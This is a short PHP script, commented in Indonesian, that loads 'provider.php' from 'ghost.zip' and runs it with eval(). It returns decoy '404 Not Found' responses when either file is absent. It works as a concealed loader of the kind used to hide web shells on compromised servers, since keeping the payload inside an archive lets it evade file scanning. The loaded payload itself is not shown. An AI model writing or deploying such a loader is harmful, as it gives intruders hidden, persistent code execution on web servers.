<?php
// ====== KONFIG ======
$zipPath       = 'ghost.zip';
$filenameInZip = 'provider.php';
$debug         = false; 

if ($debug) {
    ini_set('display_errors', '1');
    ini_set('display_startup_errors', '1');
    error_reporting(E_ALL);
}

if (!headers_sent()) {
    header('Content-Type: text/html; charset=UTF-8');
    header('X-Content-Type-Options: nosniff');
}

$zip = new ZipArchive();
if ($zip->open($zipPath) === true) {
    $code = $zip->getFromName($filenameInZip);
    $zip->close();

    if ($code !== false) {
        // buang BOM jika ada
        if (strncmp($code, "\xEF\xBB\xBF", 3) === 0) {
            $code = substr($code, 3);
        }

        // jalankan dalam buffer
        ob_start();
        try {
            eval('?>' . $code);
        } catch (Throwable $e) {
    
            if ($debug) {
                echo '<pre style="white-space:pre-wrap">';
                echo htmlspecialchars('Eval error: '.$e->getMessage(), ENT_QUOTES, 'UTF-8');
                echo '</pre>';
            } else {
               
                echo '<!-- error fallback -->Internal processing error';
            }
        }
        $out = ob_get_clean();

               if (trim($out) === '') {
            $sig = strtoupper(substr(sha1($code), 0, 12));
            $out = "<!doctype html><meta charset='utf-8'><title>OK</title>"
                 . "<p>Loaded <b>" . htmlspecialchars($filenameInZip, ENT_QUOTES, 'UTF-8') . "</b>"
                 . " from <b>" . htmlspecialchars(basename($zipPath), ENT_QUOTES, 'UTF-8') . "</b>.</p>"
                 . "<small>sig:$sig â€¢ ".date('c')."</small>";
        }

        echo $out; 
    } else {
        http_response_code(404);
        echo "Not Found php";
    }
} else {
    http_response_code(404);
    echo "Not Found zip";
}
